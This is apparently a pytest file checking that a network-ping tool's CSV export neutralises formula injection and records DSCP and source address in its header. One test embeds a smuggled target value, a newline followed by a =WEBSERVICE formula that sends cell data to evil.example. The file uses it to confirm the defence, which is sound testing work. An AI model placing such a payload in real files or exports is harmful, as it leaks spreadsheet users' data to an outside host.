"""The CSV export's header: a loaded session's target can't inject a formula
line, and DSCP and the source address are recorded (the README says so)."""
import csv
import json

from gui_harness import write_session


def _export(app, load_session, tmp_path, monkeypatch, target, extra=None):
    from pingerplot import gui
    src = tmp_path / "evil.json"
    write_session(src, target=target)
    if extra:
        data = json.loads(src.read_text(encoding="utf-8"))
        data.update(extra)
        src.write_text(json.dumps(data), encoding="utf-8")
    load_session(src)
    out = tmp_path / "out.csv"
    monkeypatch.setattr(gui.filedialog, "asksaveasfilename", lambda **kw: str(out))
    app._export()
    return out.read_text(encoding="utf-8")


def test_a_target_cant_start_a_formula_line(app, load_session, tmp_path, monkeypatch):
    text = _export(app, load_session, tmp_path, monkeypatch,
                   target='x\n=WEBSERVICE("https://evil.example/?"&B6)')
    rows = list(csv.reader(text.splitlines()))
    first_cells = [r[0] for r in rows if r]
    assert not any(c.startswith(("=", "+", "-", "@")) for c in first_cells), first_cells
    header = [c for c in first_cells if c.startswith("# target=")]
    assert len(header) == 1 and "WEBSERVICE" in header[0]     # kept, on its own comment line


def test_the_header_records_dscp_and_the_source(app, load_session, tmp_path, monkeypatch):
    text = _export(app, load_session, tmp_path, monkeypatch, target="example.net",
                   extra={"config": {"dscp": 46, "source_ip": "192.0.2.5"}})
    assert "dscp=46" in text and "source=192.0.2.5" in text
